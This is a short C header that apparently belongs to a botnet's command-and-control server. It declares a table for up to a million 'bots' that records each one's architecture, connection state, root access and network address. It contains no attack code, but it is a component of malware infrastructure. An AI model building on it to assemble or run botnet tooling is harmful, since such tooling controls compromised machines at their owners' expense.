#pragma once

#include "bool.h"
#include <arpa/inet.h>

#define MAX_BOTS 1000000

extern struct bot_t {
	int pings;
	char arch[32];
    BOOL connected, root;
    struct sockaddr_in addr;
} bot[MAX_BOTS];

BOOL epoll_init(void);
